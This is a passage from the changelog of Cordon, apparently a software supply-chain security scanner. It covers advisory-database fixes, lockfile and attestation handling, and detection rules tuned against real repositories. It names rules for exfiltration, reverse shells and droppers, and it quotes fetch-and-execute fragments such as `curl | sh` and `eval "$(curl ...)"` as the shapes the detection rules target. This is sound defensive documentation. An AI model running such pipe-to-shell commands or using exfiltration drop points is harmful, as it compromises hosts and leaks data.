# Changelog

Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
Versions follow [semantic versioning](https://semver.org/spec/v2.0.0.html).

## [0.4.0] - 2026-09-22

**Known-vulnerability detection worked for two ecosystems and not for the other
three.** The OSV importer read only `ECOSYSTEM`-typed version ranges, and npm,
crates.io and Go publish almost entirely as `SEMVER` -- 215,140 of 229,191 npm
records, 2,827 of 2,844 crates.io, 9,260 of 9,305 Go. Everything else about
those advisories was correct, and none of them reached the database: npm shipped
397 vulnerability records beside 23,550 malicious ones, cargo shipped 37 and
gomod 112. A lockfile pinning `lodash@4.17.15`, `axios@0.21.0`,
`minimist@1.2.0`, `smallvec@0.6.13` and `github.com/gogo/protobuf@v1.3.1` --
44 real advisories between them -- reported nothing at all, while the Maven and
PyPI pins beside them reported 71 findings. The scan said `complete: true` and
gave no reason to doubt it.

Both range types are now read, and a range describing several disjoint intervals
is no longer folded into one that spans the gap between them. The database went
from 59,982 records to **268,578** across eleven ecosystems, and got smaller: it
ships gzipped, 36 MB to **7.2 MB**. cargo 49 -> 964, gomod 112 -> 3,677,
npm 23,947 -> 227,937.

**The `[attest]` extra reported every honest publisher as a forgery.**
Verification called `verify_artifact`, which requires a bundle carrying a
`messageSignature`; npm `--provenance` and PyPI PEP 740 both publish DSSE
envelopes, so every genuine attestation was rejected with "Missing bundle
message signature" and reported at CRITICAL as a failed verification.
`sigstore@4.1.0` on npm and `sigstore==4.5.0` on PyPI -- published by the
Sigstore project itself -- were both accused. DSSE envelopes now go through
`verify_dsse`, and because that call proves who signed the envelope and nothing
about which artefact the statement describes, the in-toto subject digest is
compared against the pinned one: a genuine attestation for a *different* release
is still INVALID.

**`--online` failed every Yarn Berry build.** Berry's `checksum:` is a digest of
Yarn's own cache entry, prefixed with the cache key, and it was compared against
the tarball hash npm publishes -- which it can never equal. An untouched,
correct lockfile produced one CRITICAL "lockfile hash disagrees with the
registry" per dependency, up to the query ceiling, with the remediation "Do not
install". Only a value that resolves to a known algorithm and a digest of that
algorithm's length is compared now, and comparison is per algorithm, so a
lockfile recording npm's sha1 `shasum` no longer contradicts its sha512
`integrity`.

**An advisory identifier is not unique, and the database was deduplicated as
though it were.** One GHSA names several packages -- every `tensorflow`
advisory also names `tensorflow-gpu` and `tensorflow-cpu`, and 223 PyPI
identifiers name more than one package -- and one GHSA splits into several
records when the affected set is several disjoint windows, which is how Django's
212 records carry 80 identifiers. Collapsing on (ecosystem, identifier) threw
away 15,999 of 275,076 records: `tensorflow-gpu 2.5.0` reported nothing while
`tensorflow 2.5.0` reported 67, and 132 of Django's records never loaded. The
collision key now includes the package name, and only the hand-curated entries
suppress a generated one.

**A pin that spells a release differently matched nothing.** An enumerated
advisory lists versions as the upstream feed spells them -- OSV names Django's
release `3.2` -- and they were compared to the lockfile's string. `pip install
django==3.2.0` installs that same release, and `django==3.2.0` in a
`requirements.txt` reported **none** of the twelve advisories `django==3.2`
reported, with the scan complete either way. Enumerated versions now go through
the same per-ecosystem comparator the ranges use.

**The whole Swift feed was unreachable.** OSV identifies a Swift package by its
clone URL (`github.com/apple/swift-nio`) and a `Package.resolved` by its
repository path (`apple/swift-nio`), so all 39 shipped Swift advisories were
loaded, indexed and matched by nothing.

**One lockfile spoke for every ecosystem in its directory.** Coverage was
recorded per project path, so a `requirements.txt` beside a `conanfile.txt` and
an `environment.yml` produced a graph of the Python pins alone -- the C++ and
conda dependencies were dropped entirely, and nothing said so.

### Added

- **Infrastructure policy evaluated per resource.** A new detector reads a
  Terraform, Kubernetes, CloudFormation or Compose file into blocks and asks two
  questions inside each one: does it say something insecure, and does it fail to
  say something it must. The second is most of what infrastructure policy is
  about and no file-level pattern can express it -- `storage_encrypted` absent
  from an `aws_db_instance` is an unencrypted database, written nowhere. **203
  policies** ship across Terraform, Kubernetes, CloudFormation, Compose and
  Dockerfiles, each with the block it must report and the block it must not,
  both run by the suite on every push.
- **Nine more CI/CD rules, across four systems.** A fork's pull request on a
  self-hosted runner, `workflow_run` checking out the commit that triggered it,
  a publishing workflow restoring a cache a pull request can write,
  `permissions: write-all`, and a reusable workflow called by a mutable ref --
  plus the script-injection each of GitLab, Azure Pipelines, CircleCI and
  Jenkins has, none of which had a rule of its own before.

- **Six more ecosystems**: Swift, Hex, CRAN, Conan, conda and Bazel, with the
  three manifest shapes that were unreadable before them -- a Maven POM's own
  coordinates and property substitution, an npm entry whose version is
  inherited, and a hoisted entry that is not a direct dependency.
- **Advisory feeds for Swift and Hex**, taking the database to 268,578 records
  from eleven ecosystems. CRAN was requested too and OSV's export produced
  nothing this build keeps, so it is not shipped and not claimed: an empty file
  is indistinguishable from a populated one at every layer above it.
- `OPERATIONAL.ADVISORY.NO_FEED.001`. Cordon reads seventeen ecosystems and
  eleven have advisory records; a scan that includes a Conan, conda, Bazel or
  CocoaPods dependency now says which of them could not be checked at all,
  and clears `complete` rather than ending in "0 findings, scan complete".
- **A popular-package set and an allowlist for every ecosystem.** Eight of the
  seventeen had no popular set, so `_typosquat_target` returned before comparing
  anything and the check silently did not run; six had no allowlist, which is
  the state that makes a real package reportable as a squat of a name it
  resembles. Both now ship for all seventeen.
- `docs/07-ECOSYSTEMS.md`: every ecosystem, the manifests and lockfiles read for
  it, and which of advisories, typosquat, registry and provenance reach it.
  Generated from the registry and asserted by the suite, like the coverage
  matrix -- the README named no ecosystem at all before it.
- A live-registry gate on the release, `.github/workflows/live-checks.yml`,
  covering the defects an offline suite cannot see: an attestation verifier that
  rejects every genuine bundle, a hash comparison that fires on every correct
  Yarn Berry lockfile.
- Six more tutorials (06-08 and 12, 16, 17), covering secrets and exfiltration,
  CI/CD attacks, containers and IaC, vetting a package before installing it, the
  sandbox, and the source/build/binary domains. The set is renumbered so the
  filenames follow the reading order, and the index, the chain of `Next:` links
  and the numbering are now asserted by the suite.
- `OPERATIONAL.ADVISORY.DATABASE_SCOPE` on every scan of a filtered database.
  The bundled set is malicious plus high/critical, and that was previously said
  only inside the staleness note -- so a database that was filtered and current,
  which is every database for the weeks after a release, said nothing.
- `OPERATIONAL.REGISTRY.NOT_ASKED.001` and
  `OPERATIONAL.PROVENANCE.NOT_CHECKED.001` for dependencies past a query ceiling
  or a time budget. A 250-dependency lockfile reported "200 could not be
  checked" and nothing about the other 50.
- `Finding.degrades_coverage`, which lets a detector clear `ScanResult.complete`
  for a limit only it can see. An `--online` scan whose entire network layer
  failed used to report `complete: true`.
- CycloneDX `hashes` and `licenses`, and SPDX `checksums`, `licenseConcluded`,
  `licenseDeclared` and `copyrightText`. The data was already parsed from the
  lockfile and never emitted, and SPDX 2.3 requires the licence fields.

### Fixed

- A Maven POM's own `groupId`/`artifactId` were not read, and `${property}`
  references in a dependency's version were left unresolved, so a POM using the
  ordinary `${spring.version}` idiom produced dependencies with no usable
  version.
- An npm entry whose version comes from its parent was treated as unpinned, and
  a hoisted entry in `node_modules/` was reported as a direct dependency.
- Two SBOMs of the same graph were not the same document: component ordering
  and the generated serial number varied per run, so a diff of two exports of
  an unchanged project was noise.
- The advisory database was built in full on every invocation -- thirteen files,
  275,076 records, 1.34s -- before the walker read anything, and whether or not
  the target had a single dependency. It is read per ecosystem now, on the first
  question about that ecosystem, and the records are built into objects only for
  the package names actually asked about. Scanning one file with no manifest
  went from 1.81s to 0.44s, which is the difference between a pre-commit hook
  people keep and one they pass `--no-verify` to.
- `RULEPACK_VERSION` said `0.2.0` while every bundled pack declared `0.1.0` and
  nothing read the constant, so the text report, the SARIF `properties.rulepack`
  and the audit record all printed a number the release notes did not use. The
  packs carry the documented version and the suite asserts they agree.

- `uv.lock` and `pdm.lock` were declared supported and parsed as poetry
  lockfiles. Their `dependencies` is an array, not a table, so the first package
  raised `AttributeError` and the whole file was lost -- no graph, no advisory
  match, no SBOM for any project using either resolver.
- pnpm lockfile version 5 produced an empty graph, silently. The key is
  `/name/version` there and `name@version` in 6 and 9, and splitting on the last
  `@` resolved every v5 key to an empty name. Keys that cannot be read now raise
  rather than emptying the graph.
- `--timeout` did not bound the online phase. 80 dependencies under
  `--timeout 5` took 24 seconds and still reported `complete: true`; the
  deadline now reaches both network detectors, and the provenance detector is
  capped like the registry one rather than querying every dependency.
- Scanning a package archive skipped the dependency graph entirely, so the
  question most people open a `.tgz` to ask -- is this a known-malicious
  release? -- was the one it could not answer.
- `SUSPECT.CRYPTOMINER.001` fired at HIGH on any file naming the stratum
  protocol, including a URL-parser test and this project's own advisory data.
- The sandbox reported "runtime is rootless" based on which binary was on PATH.
  Podman runs rootful and Docker supports rootless; both are now asked.
- SARIF `uriBaseId` named a base the document never declared, and `ruleIndex`
  fell back to `0`, which points at a different rule.
- A PyPI filename's version was matched by substring, so a pin on `1.2` matched
  `foo-1.2.3.tar.gz`.

### Changed

- `Development Status :: 4 - Beta`. Fourth release, seventeen ecosystems, a full
  OSV-derived advisory layer, a documented interface split and 5,000 tests on
  every push -- `3 - Alpha` was inherited from 0.1.0 rather than decided.
- CI runs the suite with `-n auto` and measures coverage on one job instead of
  nine, and every job caches its wheels. The same matrix, the same tests: 26
  minutes of wall clock to single digits. The suite itself went from 224s to 50s
  on four cores, because every `Engine` used to build and index the whole
  advisory database and now indexes what it is asked about.

## [0.3.0] - 2026-09-15

**The default gate changed.** Infrastructure, container and CI posture findings
are still reported in full and no longer fail a build. A project upgrading from
0.2.0 will see builds pass that used to go red -- over `privileged: true`, a
security group open to the internet, a Dockerfile installing a tool with
`curl | sh`. Every one of those is still in the report. Two lines restore the
old behaviour:

    policy:
      advisory_domains: []

Measured on 1,427 real repositories: 76.2% of them passed the gate before this
release and 85.4% do now, with 32 FEWER findings produced, not more suppressed.
Malware false positives went from 21 to 0 -- the two `MALWARE.*` findings left
on that corpus are a deliberately vulnerable application and an npm package that
genuinely pipes curl into bash.

Detection is unchanged, and was measured four times to be sure of it: 86.9% of
1,497 real malicious PyPI packages, and the same 1,301 packages fail the default
gate as produce a high-severity finding -- so nothing this release stands down
on lets a malicious package through.

Eighteen shapes that were reported wrongly, all found by scanning real
repositories rather than by running the suite.

### Changed

- **Posture findings are reported and no longer fail the build.**
  `policy.advisory_domains` -- `infrastructure`, `container`, `cicd` -- describe
  how a project configured its own infrastructure and pipelines: a security
  group open to the internet, `privileged: true`, a workflow that installs a
  tool with `curl | sh`. Each is worth knowing and none is evidence that the
  code is compromised or is leaking anything.

  Triage says they are mostly RIGHT, which is why they are reported rather than
  deleted. `SUSPECT.CI.FETCH_EXEC.001` was correct in every sample examined --
  mise, rustup, transifex, sentry-cli, wasm-pack. `SUSPECT.DROPPER.001` was
  right about nine times in ten. `SECRET.GOOGLE.API_KEY.001` found real `AIzaSy`
  keys committed to source. They are simply not a reason to stop a release.

  Measured on 1,427 real repositories: 76.2% of ordinary open-source projects
  failed the default gate, and infrastructure alone was 354 findings and the
  sole cause in 39 of them. A scanner that fails a build on the first day gets
  switched off, and a switched-off scanner catches nothing -- the argument half
  the rules in this pack already make, applied to the gate instead.

  Malware, leaked credentials, obfuscation and exfiltration still fail, and so
  does anything MALICIOUS -- including `MALWARE.CI.SECRET_EXFIL.001`, which
  lives in `cicd` and is exempt because its category is the stronger claim. Two
  lines restore the old behaviour:

      policy:
        advisory_domains: []

### Fixed

- **A credential sent to the service that issued it.** `vllm`'s `setup.py` asks
  GitHub which commit `main` is on and authenticates so the request is not
  rate-limited; `pytorch`'s `torch/hub.py` does the same. A credential read, an
  outbound request and an install-time context made that `MALWARE.EXFIL.001` at
  CRITICAL, in the MALICIOUS category, telling the reader to treat their host as
  compromised. Nothing is exfiltrated: the host issued the token, already knows
  it, and is the only party it is good against. Narrow and in the safe
  direction -- it applies only when EVERY host named belongs to the issuer of
  every credential named, so a payload that also talks to its own collector is
  untouched.

- **A command nobody runs on install.** `sympy`'s `setup.py` imports no sympy at
  module level; the three that exist are inside classes wired as
  `cmdclass={'test': test_sympy, 'antlr': antlr}`, which `pip install` never
  runs. Following them put 233 files of sympy into install-time context, and
  `sympy/external/importtools.py` -- whose `__import__(module + '.' + submod)`
  is how a library probes for an optional dependency -- became
  `MALWARE.DYNAMIC_DISPATCH.001` at CRITICAL. `install`, `build_py`,
  `bdist_wheel`, `develop` and the rest are still followed, so the shape 82 of
  252 surviving malicious PyPI packages use is unaffected, and a command class
  nobody wires in stays followed so this cannot become a hiding place.

- **Four shapes read as hardcoded credentials.** `pass` inside `Bypass`
  (netty's FindBugs preferences); an Ant `<replace token="tri.websocket;" ...>`
  attribute (apache/dubbo); prose in a doc comment quoting an identifier in
  backticks (openapi-generator); and `some_token` as a stand-in, which is the
  same thing as `your_token`. Entropy was considered as a single blunt fix and
  rejected: the lowest true positive measured, a webshell password at 3.37, sits
  below two of those false positives.

- **pytorch was told to treat its host as compromised.** `MALWARE.EXFIL.001`,
  critical, in the MALICIOUS category, on `torch/hub.py`: inside
  `_validate_not_a_forked_repo` the module reads `GITHUB_TOKEN` from the
  environment and sends it to `api.github.com` in an `Authorization` header,
  which is what a GitHub token is for.

  It was reachable because a real packaging `setup.py` at the distribution root
  does `import torch` -- which is how a packaging script reads `__version__` --
  so the import closure put the whole library in `install_hook_paths`, and every
  credential beside a network call in any of it became install-time.

  Importing a module runs its top level and *defines* its functions. "Executes
  automatically on every install" is false for a function nothing on the install
  path calls. The context now follows a conservative call graph
  (`core.reachability.CallReachability`) rather than the import graph alone.

  The ceiling on that analysis is the part worth recording. It was 5,000
  definitions, above which it defers nothing and every finding stands -- the
  safe direction. A closure is bounded at 500 files and 500 files of a library
  that size carry around three times 5,000, so the analysis would have declined
  to run on exactly the repositories it was written for, and declined silently.
  Measured at 15,000 definitions it takes 0.6s. Now 50,000, pinned in a test
  against the file bound that feeds it.

  Not "only module-level code counts", which would have reopened the relocation
  bypass the import closure exists to close -- `setup.py` doing
  `import _bootstrap; _bootstrap.init()` puts every capability inside a `def`
  too. The question is not where the code is written but whether anything
  reaches it. A decorated function, a dunder, and anything in a file that will
  not parse are all treated as reachable, because this decides the most serious
  claim the tool makes.

- **A module that explains what it drives was read as doing it.**
  `unslothai/unsloth` opens `studio/backend/cloudflare_tunnel.py` by saying that
  "cloudflared quick tunnel gives a free https://*.trycloudflare.com URL that
  works anywhere, with no account" -- an accurate description of the tool it
  drives, and `trycloudflare.com` is on the drop-point host list precisely
  because the property being described makes it a good exfiltration endpoint.
  The destination matcher searched the raw bytes and took the first hit, so the
  sentence counted as contacting it, and a `platform.machine()` call a hundred
  lines below completed the pair.

  A string is also how a real request is written, so "inside a string" cannot
  separate the two; a docstring can, being a bare string expression and never an
  argument to a call. Comments and block comments are skipped for the same
  reason, and the later occurrences in a file are still considered -- the first
  being prose says nothing about the rest of it.

- **Where a finding points and what groups it are different questions.**
  `Engine._collapse_idiom` turns one design decision applied across many files
  into one finding, and it groups on the evidence's hash. Moving the anchor onto
  the specific half of a composite -- the fix immediately below -- gave every
  file its own evidence hash, so the grouping stopped matching and the collapse
  simply never fired.

  It is written for `community-scripts/ProxmoxVE`, which its docstring names:
  six hundred container install scripts that open with a byte-identical
  `source <(curl -fsSL .../build.func)`. Its persistence findings went from 1 to
  27 in one corpus pass, and its blocking total from 13 to 33.

  Both behaviours are wanted. The evidence now anchors on the most specific
  contributing hit, and the collapse groups on a separate `idiom_hash` taken
  from the broadest one -- the part the files share -- set only when that
  construct is at least forty bytes, which is the same specificity test the
  collapse already applied to snippets. ProxmoxVE is now 9 blocking findings,
  below where it was before either change.

- **The evidence was two hundred lines from the finding.** A composite pointed
  at the earliest of its contributing hits, on the reasoning that the first
  contributing line puts the reader at the start of the construct. That holds
  when the capabilities *are* one construct -- `curl ... | bash` anchors exactly
  where it always did -- and fails at the proximity a composite allows.

  `SUSPECT.DROPPER.001` pairs hits up to two hundred lines apart, so eight of
  sixteen findings sampled from the corpus pointed somewhere misleading:
  `milvus-io/milvus` was shown `PWD := $(shell pwd)` on line 13 as the evidence
  for a `curl | sh` on 143, `hiddify/hiddify-app` was shown
  `ifeq ($(shell uname),Darwin)` on 34 for one on 162, and
  `community-scripts/ProxmoxVE` was shown twelve lines of figlet ASCII art as
  the evidence for a `source <(curl ...)` ten lines below it.

  Every one of those findings is correct, which is the point: a false positive
  gets argued with, and a correct finding whose evidence is a banner simply gets
  disbelieved. The anchor is now the hit that carries the most of the claim --
  `fetch_exec` over `egress`, `execute` over `spawn` -- and the earliest of
  those. Composite fingerprints that were anchored on the weaker hit change
  once, so a suppression written against one needs regenerating.

- **`$(eval ...)` in a makefile was read as the shell's `eval`.**
  `$(eval ID=$(shell curl -s '.../releases/tags/v$(VERSION)' | jq .id))` is
  `jarun/nnn` asking the releases API for an id, and
  `$(eval $(call BuildPackage,uclient-fetch))` is OpenWrt expanding a macro.
  Neither runs anything it downloaded; both were `high`, "content fetched from
  the network and executed". The rule file already documents that a makefile is
  two languages in one file and already splits `CAP.MK.SPAWN.001` out for it --
  `CAP.SH.FETCH_EXEC.001` was missed. A recipe line's real `eval "$(curl ...)"`
  has no `$(` in front of the `eval` and still fires.

- **The README pointed at an Action that is not there.** The Action lives in
  `action/`, so the reference is `Threx-code/cordon/action@<ref>`. Both places
  the README showed one said `Threx-code/cordon@<ref>`, which GitHub resolves to
  the repository root and fails with "Can't find 'action.yml'" -- before any of
  the pinning this project does for a living gets a chance to matter.
  `action/README.md` had it right the whole time.

- **A public load balancer reported as an open SSH port.**
  `SUSPECT.IAC.PUBLIC_INGRESS.001` matched `0.0.0.0/0` and nothing else, while
  its message said the danger was *"combined with an administrative port"* -- so
  a security group allowing the world to reach 443, which is what a public
  service is for, was reported at `high` identically to one allowing the world to
  reach 22. It was the largest single class of noise in the corpus: 206 findings
  across 37 repositories.

  The rule now requires both halves within one block: an open range *and* one of
  the ports that is an administrative interface rather than a service. A
  `cidr_blocks = ["0.0.0.0/0"]` beside `from_port = 443` is no longer a finding;
  beside `22`, `3389`, `3306`, `6379`, `2375` or a wildcard port, it still is.

- **A file written on Windows was scanned as a different file.** Rules anchored
  with `$` stop at the `\r` of a CRLF line ending, and character classes written
  `[ \t]` exclude it, so the same repository produced different findings
  depending on which editor last saved it. Both are fixed where the rules are
  compiled rather than rule by rule, and a byte-order mark no longer counts as
  the first character of the first line.

- **A spawn argument held in a variable was invisible.** `const c = "curl ..."`
  followed by `exec(c)` resolved to no literal, so the command was never
  examined. The assignment is now followed.

- **Two reverse shells and a drop point that fell below the gate.** A
  `net.connect` to a dotted-quad IP paired with a spawn is now
  `MALWARE.REVERSE_SHELL.001` at critical, and the exfiltration drop-point
  composite accepts reconnaissance as well as credential access -- which lifted
  npm recall from 78.8% to 79.8% overall, 91.0% of the packages that carry a
  payload, with no regression on the 1,427-repository corpus.

### Changed

- **Re-pushing a release tag verifies instead of republishing.** The last step of
  a release is to commit the Action's hash pin and move the tag onto that commit,
  which runs `release.yml` a second time -- and the upload was rejected as a
  duplicate, so the release went red for having followed its own instructions.
  The build now asks the index whether the version is already there; if it is,
  nothing is built for upload and `confirm` still reads the digests back and
  still fails if they disagree with the committed pin.

## [0.2.0] - 2026-09-13

Two defaults that were wrong, both found by adopting the tool on real
repositories rather than by running its suite.

### Fixed

- **A critical finding that only existed at one worker.** `ctx.in_install_hook`
  gates the composites, and the worker pool never received the paths it is built
  from. `ParallelScanner._initialise` rebuilt each worker's context from the
  inventory, which knows a manifest *declares* an install hook but not which file
  the hook runs -- `inventory.hooks` records `package.json`, not
  `scripts/setup.js`. The parent resolves that afterwards and follows the script's
  imports; none of it crossed the process boundary.

  An install script that posts the environment out produced
  `MALWARE.EXFIL.001` at critical with one worker and **nothing** with eight. Same
  1,201 files scanned, same rules, same configuration. Parallelism engages above
  400 files and the worker count defaults to the machine's core count, so the
  default configuration on any real repository was the one missing it.

  `tests/unit/test_parallel.py` asserted that parallel and serial agree and could
  not catch this twice over. Every finding in its fixture stood on the contents of
  one file, and file contents cross a process boundary intact; and the fixture was
  460 files, where `worker_count` caps workers at the batch count and 460 files at
  the assumed 8KB each is one 4MB batch -- so the class compared a serial scan with
  another serial scan and would have passed with the pool deleted.

- **Typosquats: `psycopg` and `colord` accused at high severity.** Two of the
  four repositories this release was validated against were told they ship
  typosquats. `psycopg` is psycopg 3. `colord` is a widely used npm colour library.
  Both messages asserted "and is not itself a known package", which a 37-name
  hand-curated allowlist cannot support; five of nine ecosystems had no entries at
  all. See **Package intelligence** below, and three further changes:

  A transitive dependency is no longer accused of being a typing slip -- nobody
  typed it; it was chosen by a package the project already trusts. An ASCII
  near-miss now reports at `medium`, because the whole of the evidence is that a
  name sits one edit from a popular one and is absent from a bundled list, and no
  bundled list is a registry. A look-alike spelling stays `high`: a Cyrillic
  character is not adjacent to anything on a keyboard.

  Slip kinds are graded, and the registries corrected one grading. Separator
  variants were treated as deliberate until the first real refresh refused
  `bitvec` against `bit-vec`, `sha-1` against `sha1`, `md5` against `md-5` and
  sixteen more pairs -- both halves of every one a real crate by a different
  author.

- **A React `hooks/` directory is not a git hooks directory.**
  `hooks/useStepUp.ts` was reported as a version-control hook added in recent
  history. The directory stays in the prefix list, because `hooks/` really is a
  hooks directory under `core.hooksPath`; what separates the two is whether the
  filename is one of the 23 names git actually runs. `.sample` is excluded, which
  every fresh clone has a dozen of. A hook under a tracked hooks directory reports
  at `low` rather than `medium`, and the message says which it is -- cordon was
  reporting the setup `cordon guard install` creates.

- **An install script in your own manifest is not a compromised dependency.** Six
  `high` findings across three repositories for `"preinstall": "node
  scripts/security/only-pnpm.mjs"`, a script whose purpose is to refuse an install
  from the wrong package manager; fifty-five in one Office add-in. The attack is an
  install script in a *dependency's* manifest, and the rule only ever fired on the
  other case because `node_modules` is pruned by default. Now graded: somebody
  else's manifest stays `high`, the project's own reporting a command that reaches a
  file in this repository is `low`, and one whose command resolves to nothing
  readable is `medium`.

  "The project's own" is decided by `Repository.scanned_repository_root`, not by
  path and not by `is_git`. A published package's hostile manifest *is* the root
  manifest, and `is_git` answers "is there a repository above this" -- so scanning
  a downloaded package from inside any checkout read as first-party.

- **A security tool's own signature file is not obfuscated code.** Four `high`
  findings across four repositories, every one on the same line of a shell script
  listing regexes a malware scanner greps for, with `# _$_1e42-style obfuscated
  identifiers` in a comment beside one. Every shape in `PACKERS` is JavaScript, so
  each now declares the languages it can be the output of, and the two identifier
  schemes require several occurrences -- `_0x4f2a` is how an obfuscator *names*
  things, so real output carries hundreds and one occurrence is a file talking
  about the scheme. No path is exempted: a JavaScript payload appended to that same
  shell script is still reported.

- **A long line in prose is a table.** A 3,300-character architecture table in a
  Markdown document reported as a very long high-entropy line in a source file. The
  rule's reasoning is that a payload appended to a source file hides off-screen in a
  diff, which needs the file to be something that runs. It already declined to fire
  on files with no identified language for exactly this reason; Markdown is
  identified, so it fell through the gap. Length only: bidi, escapes and the packer
  shapes still apply to prose, because a directional override in a README is a live
  attack on whoever copies a command out of it.

- **A name ending in `_PATH` holds a path.**
  `REFRESH_TOKEN_COOKIE_PATH=/api/v1/auth/token/refresh/` reported at `high` as a
  credential. Matched on the name, deliberately: `NOT_A_SECRET` has a path
  alternative that refuses this value only because `v1` carries a digit, and
  widening it would have been a bad trade -- a real AWS secret key is
  slash-separated, digit-bearing and segment-shaped, so a path shape loose enough
  to accept a versioned URL accepts the credential too. Provider patterns still
  fire whatever the name is; only the generic entropy heuristic steps back.

### Noise

A pass over 1,427 public repositories -- 4.85 million files -- whose only purpose
was to find out what this tool says about code nobody wrote for it. The first
complete run reported 6,333 blocking findings and left 749 repositories clean.
Sixty-odd distinct false-positive classes came out of it, and the ones worth
naming are below. Every one is a test in `tests/unit/test_review_defects.py` with
the repository named, the count, and a control that fails if the fix is widened.

**Two primitives were standing in for two different acts.**

`DESERIALIZE` is separated from `EXECUTE`. A pickle load is code execution -- the
stream names classes and calls their constructors -- so it was listed under
`execute`, which made `decode AND execute` true of base64 wrapped around a
pickle. That is how every Python cache keeps a pickle in a text column, and
Django's database backend, Celery's serialization helpers and scikit-learn's
dataset loader are all spelled exactly that way. All three were reported at high.
It still counts towards the dropper composites, where `egress` supplies the
untrusted source that is what actually makes deserialization dangerous.

`DECOMPRESS` is separated from `DECODE`. Compression is not concealment: a gzip
stream is how a release is shipped, and nobody picks it to evade a scanner
because every scanner can read it. Pairing it with a process start reported every
self-updater in the corpus -- lapce, croc, dioxus, maui -- as a second-stage
loader. It remains a layer in `SUSPECT.DECODE_CHAIN.001`, where stacking is the
claim.

`WALLET` is separated from `MINE`, for the third instance of the same mistake. A
payout address is a destination, not an activity. `SUSPECT.CRYPTOMINER.001` says
in its own message that the file "references a mining pool protocol, a pool host
or a miner binary", and a bare address satisfied it on its own -- so a donation
button in ScreenToGif, SmartTube and bitcoin's own source was reported as
cryptocurrency mining at high.

**A Makefile is not an install hook.** `MALWARE.DROPPER.001`'s first branch is
the install-hook context on its own, and `Makefile`, `CMakeLists.txt`, `pom.xml`
and the Gradle files were all in it -- twenty repositories at critical for a
build that downloads a tool, among them Prometheus, OpenCV, Ollama and a Makefile
vendored inside lazygit. `pip install` executes a `setup.py` for somebody who
asked for a different package; `make` runs when a developer typed it. Both
execute commands and only one does so without being asked. The build files are
still inventoried and still reported; what they no longer claim is that nobody
asked.

**Distance is part of the claim.** `SUSPECT.DECODE_EXEC.001` says the decoded
value is passed to the execution, and asked whether a decode and an execution
both appear within two hundred lines -- which for a source file is the whole
file. Ten lines now, which is what "passed to" looks like when it is true: all
three corpus samples for the rule have the two on the same line or the next one.

**Ceilings, not suppressions, for material that exists to be read.** The manifest
detector was the last one without the fixture ceiling, on the assumption that a
manifest is never test material; pnpm's own test suite is the counterexample,
with the install hooks whose runner is under test declared four to a file. A
directory a project names after itself -- `caddytest/`, `NzbDrone.Core.Test/`,
`okio-testing-support/` -- is a test tree that no `test/` glob sees.

**Credentials that are published on purpose.** A PostHog *project* key is
write-only ingestion that PostHog's documentation tells you to put in the
browser. The `AIza` key in `google-services.json` is not a secret by Google's own
documentation: it identifies the project, and every Android binary carries it
where `strings` can read it -- eight repositories were told to rotate it,
including Firebase's own `mock-google-services.json`. The Vagrant insecure
keypair has been published since 2010 and is replaced on first `vagrant up`.

**Shapes that are not credentials.** A value that ends in a colon is the name of
a field -- uBlock's MV3 rule editor carries nineteen autocomplete entries spelled
`{ token: 'urlFilter:' }`. A comma-separated list is a list. A Ruby symbol is a
name. A PEM armour line holds no key material, which is why every PEM parser has
both of them as literals. A run of zeros is what somebody types when a field is
required. A name that declares itself `DUMMY` is believed. A single-label host
does not resolve on the public internet, so SQLAlchemy's one connection URL per
driver against `mssql2022` -- the container its own test suite starts, with
`scott:tiger` -- is a fixture.

**Trojan Source was reporting two different things as one.** A directional
override beside right-to-left script is the character doing the job it was added
to Unicode for; five of the fourteen repositories were `values-ar/strings.xml`,
which is where Android puts Arabic. And a byte-order mark cannot reorder
anything at all, so the rule's own message -- that review sees one thing and the
compiler another -- was untrue of it. Both are still reported, at severities that
match what they are.

**Things that are not what they look like.** WebP was not in the format table,
so an icon converted and left under its old `.png` name could only be reported as
"not PNG" rather than as an image saved under the wrong name. `process.env.CI` is
the most common environment lookup in the JavaScript ecosystem and decides
whether to print a progress bar; it was an anti-analysis probe. A tool's name is
not a probe either -- Bash-it ships a shell completion for `dmidecode`. NET_ADMIN
configures a container's own network namespace, which is what every VPN exists to
do, and it sat beside SYS_ADMIN in a rule about escaping the sandbox. An
uninstaller names exactly the same paths as an installer, and pi-hole's removes a
systemd unit. `use std::process::Command;` starts nothing.
`Class.forName("java.security.AccessController")` names a class a reviewer can
read. `$(NAME)` is a variable in a makefile and command substitution in a shell,
and one pattern was serving both.

**Two rules reported at a severity other than the one they declare**, which made
`cordon-scanner rules list`, the coverage matrix and the documentation wrong about
the one number that decides whether a build fails.
`POLICY.LOCKFILE.INTEGRITY.001` declared medium and reported high for the partial
case, blocking 74 of the 1,427 repositories; it now reports medium, which is where
the rest of its category sits and what its own "no entry is hashed" branch has
always used. `SUSPECT.INSTALL.SCRIPT.001` declared low and reported high for a
dependency's install script; the declaration was raised, because that grading is
right. There is a guard for the class: no finding from a detector that declares its
rules and does not escalate may exceed its declaration. Reporting lower is what
every ceiling here does; reporting higher is misinformation.

**A pin counts for its own command.** The fetch-exec mitigation looked 600 bytes
either side of a match, which in a compact Dockerfile spans several unrelated `RUN`
instructions -- so a file that pinned one download and piped another into a shell
credited the second for the first's pin. The window is now one shell command: a
logical line including its backslash continuations, or for a workflow the whole
`run:` block, which really is one script.

**The generic assignment rule, measured.** It was the widest single rule left, and
the way to shrink it honestly is to sample one finding from each of seventy
different repositories rather than many from the noisiest. Of 64 that could be
fetched, **64 blocking became 15**: a stored password hash is not a password; the
value is the name folded to letters and digits; a lowercase slug of three segments;
a non-ASCII character means human language; a UUID is weaker evidence than base62
and is graded rather than dismissed; a minified bundle is build output whatever it
is called; a rooted path may contain digits where an unrooted one may not; and nine
smaller shapes. Of the fifteen that remain, ten are real committed credentials and
five are demo passwords no shape test can distinguish -- which is the answer rather
than a gap.

**Repetition is one finding.** A construct that appears byte-identically in ten
or more files is reported once with the count and the first few paths:
`community-scripts/ProxmoxVE` ships about six hundred container install scripts
that each source a bootstrap function from a branch, which is one decision to
change and was 729 findings. Identical files collapse by content hash, and a
directory of five or more private keys is reported as a key corpus.

**Six further passes, sampled from the corpus run rather than guessed at.** Each
round read the in-progress report, counted the blocking findings by rule, mirrored
every file the largest classes named, and scanned the real bytes with the build of
the hour. The rounds stopped finding whole classes and started finding single
defects, which is what the stopping condition looks like.

What they changed, by what kind of mistake it was:

*A predicate that existed and was not asked everywhere.* Vendored code was
ceilinged by the secrets detector and not by the capability detector, so
`cosmopolitan`'s copy of CPython's standard library was reported for the import
machinery decoding a pyc and executing it. Rust test modules were read by one
detector and not the other. Python docstrings were parsed by one and not the
